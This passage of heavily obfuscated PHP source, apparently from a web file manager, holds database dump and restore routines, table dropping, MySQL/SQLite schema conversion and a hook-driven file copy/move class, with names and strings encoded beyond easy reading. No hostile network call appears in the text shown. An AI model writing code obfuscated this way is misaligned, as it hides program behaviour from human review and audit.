$¸ßéÌ¸¸ = $this->model($öô—•ß); $ê´Ñë± = 0; $†ííï»ß = 0; $— ¯¡Ê = 10000; $…Íş¬› = fopen($˜Ø²ªîé, $_SERVER[¹ş¤¶ĞÖ][1099]); $Âœ†°®• = $¸ßéÌ¸¸->getPk(); $·‹¥’­€ = $¸ßéÌ¸¸->getDbFields(); $ò¶ó¤ºƒ = $_SERVER[¹ş¤¶ĞÖ][12]; if ($GLOBALS[$_SERVER[¹ş¤¶ĞÖ][813]] && in_array($öô—•ß, array($_SERVER[¹ş¤¶ĞÖ][1100], $_SERVER[¹ş¤¶ĞÖ][1101]))) { $ò¶ó¤ºƒ = $öô—•ß; } do { $Ç™¤’Â© = array($Âœ†°®• => array($_SERVER[¹ş¤¶ĞÖ][1047], $†ííï»ß)); $¤ÖÒÀù = $¸ßéÌ¸¸->where($Ç™¤’Â©)->field($·‹¥’­€)->order($Âœ†°®• . $_SERVER[¹ş¤¶ĞÖ][1102])->limit($— ¯¡Ê)->select(); $¤ÖÒÀù = !empty($¤ÖÒÀù) ? $¤ÖÒÀù : array(); if (!($Ø‹ ‘Â™ = count($¤ÖÒÀù))) { break; } $õ×Ö’‚ = end($¤ÖÒÀù); $†ííï»ß = $õ×Ö’‚[$Âœ†°®•]; $‘Ü«“‹Ü = array(); foreach ($¤ÖÒÀù as $‘¿ñïÎµ) { if ($ò¶ó¤ºƒ) { if ($öô—•ß == $_SERVER[¹ş¤¶ĞÖ][1100]) { if ($‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][33]] == $_SERVER[¹ş¤¶ĞÖ][1103]) { $ô®·ŠÖ’ = json_decode($‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][403]], !0); if ($ô®·ŠÖ’[$_SERVER[¹ş¤¶ĞÖ][32]] == $GLOBALS[$_SERVER[¹ş¤¶ĞÖ][813]] && $ô®·ŠÖ’[$_SERVER[¹ş¤¶ĞÖ][776]] != 1) { continue; } } } else { if ($‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][33]] == $_SERVER[¹ş¤¶ĞÖ][1104] && $‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][94]] == $_SERVER[¹ş¤¶ĞÖ][805]) { continue; } } } if ($î£©Ü£´) { $‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][84]] = "\x7b\x69\x6f\x3a{$î£©Ü£´}\x7d" . substr($‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][84]], strlen("\173\x69\x6f\x3a{$‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][843]]}\175")); $‘¿ñïÎµ[$_SERVER[¹ş¤¶ĞÖ][843]] = $î£©Ü£´; } $‘Ü«“‹Ü[] = $_SERVER[¹ş¤¶ĞÖ][1105] . $this->sqlEncode($‘¿ñïÎµ) . $_SERVER[¹ş¤¶ĞÖ][1106]; } $’…äŠ«€ = "\111\x4e\x53\x45\x52\x54\40\x49\116\x54\x4f\x20\x60{$öô—•ß}\140\x20\x28\140" . implode($_SERVER[¹ş¤¶ĞÖ][1107], $·‹¥’­€) . $_SERVER[¹ş¤¶ĞÖ][1108]; fwrite($…Íş¬›, $’…äŠ«€ . implode($_SERVER[¹ş¤¶ĞÖ][1109], $‘Ü«“‹Ü) . $_SERVER[¹ş¤¶ĞÖ][71] . PHP_EOL); $ê´Ñë± += $Ø‹ ‘Â™; if ($÷®ŒÎ) { $÷®ŒÎ->update($Ø‹ ‘Â™); } } while ($— ¯¡Ê == $Ø‹ ‘Â™); fclose($…Íş¬›); return $ê´Ñë±; } public function sqlToDb($ÔŠÓë¶´, &$¿±ÔÌ±–) { $Ö€ù›Ô° =& $_SERVER[¹ş¤¶ĞÖ]; $øÆéÜ°£ = $this->model()->db(); $ˆŒ§ÔŠÌ = @fopen($ÔŠÓë¶´, $Ö€ù›Ô°[1110]); if (!$ˆŒ§ÔŠÌ) { return !1; } $´éÑ‘‘— = 0; $Ş¡—ÓÙÄ = $Ö€ù›Ô°[12]; $¦Ê…ó = array(); $™úÃ «Ä = $this->dbType(); $¯šä™ = $™úÃ «Ä == $Ö€ù›Ô°[13] ? 500 : 2000; $Õ£¯¦Í = basename($ÔŠÓë¶´, $Ö€ù›Ô°[814]); $Îí±áë = 0; $æµø®õ’ = 4194304 - 104858; $ÂşÀó„ = 1000000 - 104858; while (!feof($ˆŒ§ÔŠÌ)) { $Ïª™¸¼ = trim(fgets($ˆŒ§ÔŠÌ)); if (!$Ïª™¸¼) { continue; } $İÎÔ¼ìà = $this->sqlDecode($Ïª™¸¼, $™úÃ «Ä, $Õ£¯¦Í); if (stripos($İÎÔ¼ìà, $Ö€ù›Ô°[384]) === 0) { if (!$Ş¡—ÓÙÄ) { $Ş¡—ÓÙÄ = $İÎÔ¼ìà . $Ö€ù›Ô°[53]; } continue; } if ($¿±ÔÌ±–) { $¿±ÔÌ±–->task[$Ö€ù›Ô°[812]] += 1; } $´éÑ‘‘—++; $¦Ê…ó[] = rtrim(rtrim(trim($İÎÔ¼ìà), $Ö€ù›Ô°[50]), $Ö€ù›Ô°[71]); $Ö®ğ¶ = null; $ÌÃ„°Æ = strlen($İÎÔ¼ìà); $Îí±áë += $ÌÃ„°Æ; if ($Îí±áë >= ($¯šä™ == 500 ? $ÂşÀó„ : $æµø®õ’)) { $Ö®ğ¶ = array_pop($¦Ê…ó); if ($´éÑ‘‘— > 1) { $´éÑ‘‘—--; } } if ($´éÑ‘‘— >= $¯šä™ || $Ö®ğ¶) { $İÎÔ¼ìà = $Ş¡—ÓÙÄ . implode($Ö€ù›Ô°[50], $¦Ê…ó); if (!$øÆéÜ°£->execute($İÎÔ¼ìà)) { return !1; } if ($¿±ÔÌ±–) { $¿±ÔÌ±–->update($´éÑ‘‘—); } $¦Ê…ó = array(); $´éÑ‘‘— = 0; $Îí±áë = 0; if ($Ö®ğ¶) { $¦Ê…ó = array($Ö®ğ¶); $´éÑ‘‘— = 1; $Îí±áë = $ÌÃ„°Æ; } } } fclose($ˆŒ§ÔŠÌ); if (!empty($¦Ê…ó)) { $İÎÔ¼ìà = $Ş¡—ÓÙÄ . implode($Ö€ù›Ô°[50], $¦Ê…ó); if (!$øÆéÜ°£->execute($İÎÔ¼ìà)) { return !1; } if ($¿±ÔÌ±–) { $¿±ÔÌ±–->update($´éÑ‘‘—); } } return !0; } public function dropTable($†åš¨İŠ = null) { $ğœ¸‰û­ = $this->model()->db(); $«ÃáÖü’ = $†åš¨İŠ ? array($†åš¨İŠ) : $ğœ¸‰û­->getTables(); if (!$«ÃáÖü’) { return; } foreach ($«ÃáÖü’ as $†åš¨İŠ) { if ($†åš¨İŠ) { $†åš¨İŠ = strtolower($†åš¨İŠ); } else { continue; } $ğœ¸‰û­->execute("\144\162\x6f\160\40\164\141\x62\154\145\40\151\x66\x20\x65\170\151\x73\164\x73\x20\140{$†åš¨İŠ}\x60"); } } private function sqlEncode($¬Øå†²Ç) { $©ƒŸó–Ã =& $_SERVER[¹ş¤¶ĞÖ]; $Ê•Ù‡‰û = array(); foreach ($¬Øå†²Ç as $ËğÉ‡) { if (is_array($ËğÉ‡)) { $ËğÉ‡ = json_encode_force($ËğÉ‡); } $ËğÉ‡ = addslashes($ËğÉ‡); $ËğÉ‡ = str_replace(array($©ƒŸó–Ã[1111], $©ƒŸó–Ã[231]), array($©ƒŸó–Ã[1112], $©ƒŸó–Ã[1113]), $ËğÉ‡); $Ê•Ù‡‰û[] = str_replace($©ƒŸó–Ã[58], $©ƒŸó–Ã[1114], $ËğÉ‡); } return $©ƒŸó–Ã[58] . implode($©ƒŸó–Ã[1115], $Ê•Ù‡‰û) . $©ƒŸó–Ã[58]; } private function sqlDecode($³Šò”Ç, $ èğ¦•ô, $ÙÂ“°È¨ = '') { $¢„Ôï¿ƒ =& $_SERVER[¹ş¤¶ĞÖ]; $³Šò”Ç = str_replace(array($¢„Ôï¿ƒ[1112], $¢„Ôï¿ƒ[1113]), array($¢„Ôï¿ƒ[1111], $¢„Ôï¿ƒ[231]), $³Šò”Ç); if ($ èğ¦•ô == $¢„Ôï¿ƒ[13]) { return $ÙÂ“°È¨ != $¢„Ôï¿ƒ[1116] ? stripslashes($³Šò”Ç) : $³Šò”Ç; } if ($ÙÂ“°È¨ == $¢„Ôï¿ƒ[1116]) { $³Šò”Ç = str_replace($¢„Ôï¿ƒ[1117], $¢„Ôï¿ƒ[118], stripslashes($³Šò”Ç)); } return $³Šò”Ç; } public function getSqlFile($ÀÃªâóÍ = '') { $‰ÓÄ‰‚Ó =& $_SERVER[¹ş¤¶ĞÖ]; $®ËÈ”Â = $this->dbType(!0); $Ò›æšÒĞ = CONTROLLER_DIR . "\151\x6e\163\164\x61\x6c\154\57\144\141\164\x61\57{$®ËÈ”Â}\56\x73\x71\x6c"; $ğÜã‡•¹ = file_get_contents($Ò›æšÒĞ); $‚æ½¿Æï = $‰ÓÄ‰‚Ó[1118] . ($®ËÈ”Â == $‰ÓÄ‰‚Ó[830] ? $‰ÓÄ‰‚Ó[1119] : $‰ÓÄ‰‚Ó[1120]) . $‰ÓÄ‰‚Ó[1121]; preg_match_all($‚æ½¿Æï, $ğÜã‡•¹, $£Å´Äİú); $Œ“‘ÎÛ = $£Å´Äİú[1]; $ó’ˆÛüì = $this->model()->db(); $µšãæùĞ = $ó’ˆÛüì->getTables(); $˜õìóÕ° = TEMP_FILES . $‰ÓÄ‰‚Ó[1122] . date($‰ÓÄ‰‚Ó[240]) . $‰ÓÄ‰‚Ó[8]; del_dir($˜õìóÕ°); mk_dir($˜õìóÕ°); $ëîİ¼  = $˜õìóÕ° . $‰ÓÄ‰‚Ó[1123]; $ãÍíÎß = $˜õìóÕ° . $‰ÓÄ‰‚Ó[1124]; $í÷©²  = $®ËÈ”Â == $‰ÓÄ‰‚Ó[13] ? $‰ÓÄ‰‚Ó[830] : $‰ÓÄ‰‚Ó[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\154\57\x64\x61\x74\141\x2f{$í÷©² }\x2e\163\x71\154", $˜õìóÕ°); @touch($˜õìóÕ° . $®ËÈ”Â . $‰ÓÄ‰‚Ó[814]); $å§•–ï˜ = fopen($ëîİ¼ , $‰ÓÄ‰‚Ó[1099]); $İ¼å¿Œ = fopen($ãÍíÎß, $‰ÓÄ‰‚Ó[1099]); if ($®ËÈ”Â == $‰ÓÄ‰‚Ó[13]) { $µšãæùĞ = array_diff($µšãæùĞ, array($‰ÓÄ‰‚Ó[810], $‰ÓÄ‰‚Ó[811])); $Í ÇÉ¡ = array($‰ÓÄ‰‚Ó[1125], $‰ÓÄ‰‚Ó[1126], $‰ÓÄ‰‚Ó[1127]); fwrite($İ¼å¿Œ, implode(PHP_EOL, $Í ÇÉ¡) . PHP_EOL . PHP_EOL); foreach ($µšãæùĞ as $¬‹æ·êğ) { $Û·—·Ö = $this->sqlFromSqlite($¬‹æ·êğ); if (!$Û·—·Ö[$‰ÓÄ‰‚Ó[13]]) { continue; } fwrite($İ¼å¿Œ, $Û·—·Ö[$‰ÓÄ‰‚Ó[13]] . PHP_EOL . PHP_EOL); if (!in_array($¬‹æ·êğ, $Œ“‘ÎÛ)) { fwrite($å§•–ï˜, $Û·—·Ö[$‰ÓÄ‰‚Ó[830]] . PHP_EOL . PHP_EOL); } } } else { foreach ($µšãæùĞ as $¬‹æ·êğ) { $Û·—·Ö = $this->sqlFromMysql($¬‹æ·êğ); if (!$Û·—·Ö[$‰ÓÄ‰‚Ó[830]]) { continue; } fwrite($å§•–ï˜, $Û·—·Ö[$‰ÓÄ‰‚Ó[830]] . PHP_EOL . PHP_EOL); if (!in_array($¬‹æ·êğ, $Œ“‘ÎÛ)) { fwrite($İ¼å¿Œ, $Û·—·Ö[$‰ÓÄ‰‚Ó[13]] . PHP_EOL . PHP_EOL); } } } fclose($å§•–ï˜); fclose($İ¼å¿Œ); $ğÜã‡•¹ = array($‰ÓÄ‰‚Ó[830] => $ëîİ¼ , $‰ÓÄ‰‚Ó[13] => $ãÍíÎß); return $ÀÃªâóÍ ? $ğÜã‡•¹[$ÀÃªâóÍ] : $ğÜã‡•¹; } public function dbType($‚„ôæª = false) { $À§È¤ =& $_SERVER[¹ş¤¶ĞÖ]; $Àçƒü½› = $‚„ôæª ? $GLOBALS[$À§È¤[6]][$À§È¤[21]] : $this->database; $Àçƒü½› = array_change_key_case($Àçƒü½›); $ˆó¬ƒ´ş = $Àçƒü½›[$À§È¤[1000]]; if ($ˆó¬ƒ´ş == $À§È¤[997]) { $ü»Ñúã» = explode($À§È¤[4], $Àçƒü½›[$À§È¤[1006]]); $ˆó¬ƒ´ş = $ü»Ñúã»[0]; } $©ô·Õº = array($À§È¤[1128] => $À§È¤[13], $À§È¤[943] => $À§È¤[830]); if (isset($©ô·Õº[$ˆó¬ƒ´ş])) { $ˆó¬ƒ´ş = $©ô·Õº[$ˆó¬ƒ´ş]; } return $ˆó¬ƒ´ş; } public function sqlFromMysql($ì¸Ùñ¼Á, $§°êûœ = '') { $ˆ¸«é§á =& $_SERVER[¹ş¤¶ĞÖ]; $û¾¬º¹ = $this->model()->db(); $—ĞÁÙ«ğ = $û¾¬º¹->query($ˆ¸«é§á[1129] . $ì¸Ùñ¼Á . $ˆ¸«é§á[414]); if (!$—ĞÁÙ«ğ || !$—ĞÁÙ«ğ[0]) { return !1; } $×ÏÔûö = _get($—ĞÁÙ«ğ[0], $ˆ¸«é§á[1130], $ˆ¸«é§á[12]); if (!$×ÏÔûö) { return !1; } $ĞéŸÓ´“ = "\x44\122\x4f\x50\40\x54\x41\102\114\x45\x20\111\x46\x20\x45\130\111\123\x54\123\x20\140{$ì¸Ùñ¼Á}\140\x3b" . PHP_EOL . $×ÏÔûö . $ˆ¸«é§á[71]; if ($§°êûœ && $§°êûœ == $ˆ¸«é§á[830]) { return $ĞéŸÓ´“; } $ú‚ß×³ = array_change_key_case($GLOBALS[$ˆ¸«é§á[6]][$ˆ¸«é§á[21]]); $Ğôù®ú = $ú‚ß×³[$ˆ¸«é§á[1005]]; $ŸÂ Â„ = $ˆ¸«é§á[1131] . $Ğôù®ú . $ˆ¸«é§á[1132] . $ì¸Ùñ¼Á . $ˆ¸«é§á[58]; $ı±ĞÜ¦Õ = $ˆ¸«é§á[1133] . $ì¸Ùñ¼Á . $ˆ¸«é§á[931]; $Ï¶—Øš¹ = $û¾¬º¹->query($ŸÂ Â„); if (empty($Ï¶—Øš¹)) { $áè»¢ê‚ = array($ˆ¸«é§á[830] => $ˆ¸«é§á[12], $ˆ¸«é§á[13] => $ˆ¸«é§á[12]); return $§°êûœ ? $áè»¢ê‚[$§°êûœ] : $áè»¢ê‚; } $Æ‹ŸŞğê = $û¾¬º¹->query($ı±ĞÜ¦Õ); $íÆçˆŸà = $ˆ¸«é§á[12]; $½—÷òÏü = array(); foreach ($Æ‹ŸŞğê as $àÜ‚ñ„Ÿ) { if (!$íÆçˆŸà && $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1134]] == $ˆ¸«é§á[1135]) { $íÆçˆŸà = $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1136]]; } if (isset($½—÷òÏü[$àÜ‚ñ„Ÿ[$ˆ¸«é§á[1134]]])) { $½—÷òÏü[$àÜ‚ñ„Ÿ[$ˆ¸«é§á[1134]]][$ˆ¸«é§á[1137]][] = $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1136]]; continue; } $½—÷òÏü[$àÜ‚ñ„Ÿ[$ˆ¸«é§á[1134]]] = array($ˆ¸«é§á[1138] => $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1134]], $ˆ¸«é§á[1137] => array($àÜ‚ñ„Ÿ[$ˆ¸«é§á[1136]]), $ˆ¸«é§á[1139] => $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1140]] == $ˆ¸«é§á[88] ? 0 : 1); } $íœ©¹õÒ = array(); foreach ($½—÷òÏü as $àÜ‚ñ„Ÿ) { $Â‘«’Ù© = $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1138]] == $ˆ¸«é§á[1135]; $×€‰É­ = array($ˆ¸«é§á[1141], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1139]] == $ˆ¸«é§á[88] && !$Â‘«’Ù© ? $ˆ¸«é§á[1142] : $ˆ¸«é§á[12], $ˆ¸«é§á[1143], $ˆ¸«é§á[1144] . $ì¸Ùñ¼Á . $ˆ¸«é§á[11] . ($Â‘«’Ù© ? $ˆ¸«é§á[1145] : $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1138]]) . $ˆ¸«é§á[118], $ˆ¸«é§á[1146], $ˆ¸«é§á[118] . $ì¸Ùñ¼Á . $ˆ¸«é§á[118], $ˆ¸«é§á[1147] . implode($ˆ¸«é§á[1148], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1137]]) . $ˆ¸«é§á[1149]); $íœ©¹õÒ[] = implode($ˆ¸«é§á[53], $×€‰É­) . $ˆ¸«é§á[71]; } $‡ôú´±ó = array(); $¾äÊçƒ = array($ˆ¸«é§á[1150] => $ˆ¸«é§á[1151], $ˆ¸«é§á[1151] => $ˆ¸«é§á[1151], $ˆ¸«é§á[317] => $ˆ¸«é§á[344], $ˆ¸«é§á[316] => $ˆ¸«é§á[344]); foreach ($Ï¶—Øš¹ as $àÜ‚ñ„Ÿ) { $×€‰É­ = array($ˆ¸«é§á[118] . $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1152]] . $ˆ¸«é§á[118], isset($¾äÊçƒ[$àÜ‚ñ„Ÿ[$ˆ¸«é§á[1153]]]) ? $¾äÊçƒ[$àÜ‚ñ„Ÿ[$ˆ¸«é§á[1153]]] : $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1154]], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1155]] == $ˆ¸«é§á[929] ? $ˆ¸«é§á[1156] : $ˆ¸«é§á[1157], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[1152]] == $íÆçˆŸà ? $ˆ¸«é§á[1158] : $ˆ¸«é§á[12], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[980]] ? strtoupper(str_replace($ˆ¸«é§á[11], $ˆ¸«é§á[12], $àÜ‚ñ„Ÿ[$ˆ¸«é§á[980]])) : $ˆ¸«é§á[12]); $‡ôú´±ó[] = trim(implode($ˆ¸«é§á[53], $×€‰É­)); } $êÉÂ—‚ê = array($ˆ¸«é§á[1159] . $ì¸Ùñ¼Á . $ˆ¸«é§á[1160], $ˆ¸«é§á[1161] . $ì¸Ùñ¼Á . $ˆ¸«é§á[1162], implode($ˆ¸«é§á[50] . PHP_EOL, $‡ôú´±ó), $ˆ¸«é§á[977]); $ğó¼Ëì± = implode(PHP_EOL, array_merge($êÉÂ—‚ê, $íœ©¹õÒ)); if ($§°êûœ && $§°êûœ == $ˆ¸«é§á[13]) { return $ğó¼Ëì±; } $áè»¢ê‚ = array($ˆ¸«é§á[830] => $ĞéŸÓ´“, $ˆ¸«é§á[13] => $ğó¼Ëì±); return $§°êûœ ? $áè»¢ê‚[$§°êûœ] : $áè»¢ê‚; } public function sqlFromSqlite($Ï½¢ø¶, $»×şø‹ = '') { $Û¡¦äí =& $_SERVER[¹ş¤¶ĞÖ]; $„Üş•Ô¦ = $this->model()->db(); $£Èšó‡± = "\120\122\x41\107\115\101\40\x54\x41\102\x4c\x45\x5f\x49\x4e\106\117\40\x28\x27{$Ï½¢ø¶}\x27\51"; $Ø¦†·Àõ = "\x53\x45\114\105\103\124\x20\x2a\x20\x46\122\117\115\40\x73\161\154\151\x74\145\137\155\141\163\164\145\x72\x20\x57\110\105\122\105\x20\164\142\x6c\137\156\141\155\x65\40\75\x20\x27{$Ï½¢ø¶}\x27"; $ÛÍÌŞ›Ğ = $„Üş•Ô¦->query($£Èšó‡±); if (empty($ÛÍÌŞ›Ğ)) { $ƒ¸©•–ä = array($Û¡¦äí[830] => $Û¡¦äí[12], $Û¡¦äí[13] => $Û¡¦äí[12]); return $»×şø‹ ? $ƒ¸©•–ä[$»×şø‹] : $ƒ¸©•–ä; } $‰×Éæ÷ = $„Üş•Ô¦->query($Ø¦†·Àõ); $†»«˜¢ = $ôö…’ Ÿ = array(); foreach ($‰×Éæ÷ as $ÂÃµ“â) { if ($ÂÃµ“â[$Û¡¦äí[33]] == $Û¡¦äí[308]) { $†»«˜¢[] = $ÂÃµ“â[$Û¡¦äí[1163]]; } else { $ôö…’ Ÿ[$ÂÃµ“â[$Û¡¦äí[32]]] = $ÂÃµ“â[$Û¡¦äí[1163]]; } } $¨†˜ÛíÃ = array_merge(array($Û¡¦äí[1159] . $Ï½¢ø¶ . $Û¡¦äí[118]), $†»«˜¢, array_values($ôö…’ Ÿ)); $¨†˜ÛíÃ = implode($Û¡¦äí[71] . PHP_EOL, $¨†˜ÛíÃ) . $Û¡¦äí[71]; if ($»×şø‹ && $»×şø‹ == $Û¡¦äí[13]) { return $¨†˜ÛíÃ; } $ï»ğÊÓş = array(); $ĞÍ´êÓÒ = array($Û¡¦äí[1151] => $Û¡¦äí[1164], $Û¡¦äí[344] => $Û¡¦äí[1165]); $†îŸÉù = $Û¡¦äí[12]; foreach ($ÛÍÌŞ›Ğ as $ÂÃµ“â) { if ($ÂÃµ“â[$Û¡¦äí[57]] == $Û¡¦äí[88]) { $†îŸÉù = $ÂÃµ“â[$Û¡¦äí[32]]; } $îÉÍ¬¬¢ = array($Û¡¦äí[414] . $ÂÃµ“â[$Û¡¦äí[32]] . $Û¡¦äí[414], isset($ĞÍ´êÓÒ[$ÂÃµ“â[$Û¡¦äí[33]]]) ? $ĞÍ´êÓÒ[$ÂÃµ“â[$Û¡¦äí[33]]] : $ÂÃµ“â[$Û¡¦äí[33]], $ÂÃµ“â[$Û¡¦äí[35]] == $Û¡¦äí[88] ? $Û¡¦äí[1156] : $Û¡¦äí[1166] . $ÂÃµ“â[$Û¡¦äí[56]], $ÂÃµ“â[$Û¡¦äí[57]] == $Û¡¦äí[88] ? $Û¡¦äí[1167] : $Û¡¦äí[12]); $ï»ğÊÓş[] = trim(implode($Û¡¦äí[53], $îÉÍ¬¬¢)); } foreach ($ôö…’ Ÿ as $€«†«£Ï => $ÚÚ°„Š³) { $«€ùÖÍÂ = str_replace($Û¡¦äí[1168] . $Ï½¢ø¶ . $Û¡¦äí[11], $Û¡¦äí[12], $€«†«£Ï); $ó„Ê•ƒê = str_replace(array($Û¡¦äí[118], $Û¡¦äí[988]), $Û¡¦äí[414], substr($ÚÚ°„Š³, stripos($ÚÚ°„Š³, $Û¡¦äí[289]))); if ($«€ùÖÍÂ == $Û¡¦äí[1145]) { $ªî¡ááî = $Û¡¦äí[1169] . $†îŸÉù . $Û¡¦äí[1170]; } else { $ªî¡ááî = (stripos($«€ùÖÍÂ, $Û¡¦äí[11]) ? $Û¡¦äí[1171] : $Û¡¦äí[12]) . ($Û¡¦äí[1172] . $«€ùÖÍÂ . $Û¡¦äí[1173] . $ó„Ê•ƒê); } $ï»ğÊÓş[] = $ªî¡ááî; } $¿Øö¼Ñ˜ = array($Û¡¦äí[1174] . $Ï½¢ø¶ . $Û¡¦äí[1175], $Û¡¦äí[1176] . $Ï½¢ø¶ . $Û¡¦äí[1177], implode($Û¡¦äí[50] . PHP_EOL, $ï»ğÊÓş), $Û¡¦äí[1178]); $°ªÓğ÷» = implode(PHP_EOL, $¿Øö¼Ñ˜); if ($»×şø‹ && $»×şø‹ == $Û¡¦äí[830]) { return $°ªÓğ÷»; } $ƒ¸©•–ä = array($Û¡¦äí[830] => $°ªÓğ÷», $Û¡¦äí[13] => $¨†˜ÛíÃ); return $»×şø‹ ? $ƒ¸©•–ä[$»×şø‹] : $ƒ¸©•–ä; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ô®õƒ¾–, $Èõ‘àõ) { $êÖ×†“Ø =& $_SERVER[¹ş¤¶ĞÖ]; $•ÁÄì  = $Èõ‘àõ; $GLOBALS[$êÖ×†“Ø[1179]] = $êÖ×†“Ø[1180] . $ô®õƒ¾–; Hook::trigger($êÖ×†“Ø[1180] . $ô®õƒ¾– . $êÖ×†“Ø[1181], $•ÁÄì ); $¡æ÷ÁÛ¥ = self::driverMake($Èõ‘àõ[0]); if (!$¡æ÷ÁÛ¥) { return !1; } if (method_exists($¡æ÷ÁÛ¥, $ô®õƒ¾–)) { $åØë™˜ = @call_user_func_array(array($¡æ÷ÁÛ¥, $ô®õƒ¾–), $Èõ‘àõ); } else { if (method_exists($¡æ÷ÁÛ¥, $êÖ×†“Ø[1182])) { $åØë™˜ = @call_user_func_array(array($¡æ÷ÁÛ¥, $ô®õƒ¾–), $Èõ‘àõ); } else { if (method_exists(self, $ô®õƒ¾–)) { $åØë™˜ = @call_user_func_array(array(self, $ô®õƒ¾–), $Èõ‘àõ); } else { $åØë™˜ = call_user_func_array(array(parent, $ô®õƒ¾–), $Èõ‘àõ); } } } Hook::trigger($êÖ×†“Ø[1180] . $ô®õƒ¾– . $êÖ×†“Ø[1183], $•ÁÄì , $åØë™˜); return $åØë™˜; } public static function init($óõšåßç) { return self::driverMake($óõšåßç); } public static function copy($¬¹é´§, $Ş–Ÿî¼, $ßœîÁç = false, $€Âñ‘¶§ = false) { return self::copyMoveStart($¬¹é´§, $Ş–Ÿî¼, $ßœîÁç, $_SERVER[¹ş¤¶ĞÖ][575], $€Âñ‘¶§); } public static function move($‚í‡¿ëã, $—…–¯±Ó, $Ú—ŸÁ†£ = false, $×¿­õ¼¹ = false) { return self::copyMoveStart($‚í‡¿ëã, $—…–¯±Ó, $Ú—ŸÁ†£, $_SERVER[¹ş¤¶ĞÖ][577], $×¿­õ¼¹); } private static function copyMoveStart($ù…ª”Â, $øª¤ê“ , $¸¢†­Ü’, $†˜–æ’â, $­¼ïµªĞ) { $¿¶³ğ›Î =& $_SERVER[¹ş¤¶ĞÖ]; $ıÅ×Ôäã = array($ù…ª”Â, $øª¤ê“ , $¸¢†­Ü’, $­¼ïµªĞ); Hook::trigger($¿¶³ğ›Î[1180] . $†˜–æ’â . $¿¶³ğ›Î[1181], $ıÅ×Ôäã); $ˆÌÚÃ = self::copyMove($ù…ª”Â, $øª¤ê“ , $¸¢†­Ü’, $†˜–æ’â, $­¼ïµªĞ); Hook::trigger($¿¶³ğ›Î[1180] . $†˜–æ’â . $¿¶³ğ›Î[1183], $ıÅ×Ôäã, $ˆÌÚÃ); return $ˆÌÚÃ; } public static function saveFile($³î±ğøŒ, $Æûåã¬˜, $ç£¯Ë¨± = true) { $ëşÏ¾º» =& $_SERVER[¹ş¤¶ĞÖ]; $Ğ¨ó€ã = self::info($Æûåã¬˜); $ûû§ìá = self::driverMake($³î±ğøŒ); $Ì‡ÓŠ = self::driverMake($Æûåã¬˜); $ïĞÈ´¬Ğ = !1; if ($Ì‡ÓŠ->pathParse[$ëşÏ¾º»[1184]]) { $ïĞÈ´¬Ğ = $Ì‡ÓŠ; $–†ŠÔê· = $Ì‡ÓŠ->pathParse[$ëşÏ¾º»[1184]]; $Ì‡ÓŠ = self::driverMake($–†ŠÔê·); } if ($ûû§ìá->pathParse[$ëşÏ¾º»[1184]]) { $å‘ÑµÕ = $ûû§ìá->pathParse[$ëşÏ¾º»[1184]]; $ûû§ìá = self::driverMake($å‘ÑµÕ); } $Ü³ïû³ = $Ì‡ÓŠ->pathFather($Æûåã¬˜); $ÎÓÚÒÃ÷ = !0; if (!$ç£¯Ë¨± && self::driverIsSame($ûû§ìá, $Ì‡ÓŠ)) { $ÎÓÚÒÃ÷ = !1; } $Æ³ƒú€— = self::copyFile($ûû§ìá, $³î±ğøŒ, $Ì‡ÓŠ, $Ü³ïû³, $Ğ¨ó€ã[$ëşÏ¾º»[32]], $ÎÓÚÒÃ÷); if ($ïĞÈ´¬Ğ) { $Æ³ƒú€— = $ïĞÈ´¬Ğ->getPathOuter($Æ³ƒú€—); } return $Æ³ƒú€—; } private static function copyMove($¨’¾‚, $Áöù••“, $¹ªáî¢’, $•ŠüÑı¯, $óÖøØÂ = false) { $·»›º¿ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¨’¾‚ || $¨’¾‚ == $·»›º¿[8] || !$Áöù••“) { return !1; } ignore_timeout(); $ÕÅ‹°Ëò = self::driverMake($¨’¾‚); $åÄİÅ = self::driverMake($Áöù••“); $ë¥¾ä¾­ = $•ŠüÑı¯ == $·»›º¿[577]; $ç¦¡÷ó¨ = !1; if ($åÄİÅ->pathParse[$·»›º¿[1184]]) { $ç¦¡÷ó¨ = $åÄİÅ; $Áöù••“ = $åÄİÅ->pathParse[$·»›º¿[1184]]; $åÄİÅ = self::driverMake($Áöù••“); } if ($ÕÅ‹°Ëò->pathParse[$·»›º¿[1184]]) { $¨’¾‚ = $ÕÅ‹°Ëò->pathParse[$·»›º¿[1184]]; $ÕÅ‹°Ëò = self::driverMake($¨’¾‚); } self::check($ÕÅ‹°Ëò, $¨’¾‚, $åÄİÅ, $Áöù••“); Hook::trigger($·»›º¿[1185], $ÕÅ‹°Ëò, $¨’¾‚, $åÄİÅ, $Áöù••“); $ò—Å¤ê¦ = self::driverIsSame($ÕÅ‹°Ëò, $åÄİÅ); if ($ò—Å¤ê¦) { if ($•ŠüÑı¯ == $·»›º¿[577] && !method_exists($åÄİÅ, $·»›º¿[1186]) && trim($Áöù••“, $·»›º¿[8]) == trim($åÄİÅ->pathFather($¨’¾‚), $·»›º¿[8])) { if ($ÕÅ‹°Ëò->pathThis($¨’¾‚) != $óÖøØÂ && !$ÕÅ‹°Ëò->isTypeObject()) { return $ÕÅ‹°Ëò->rename($¨’¾‚, $óÖøØÂ); } return 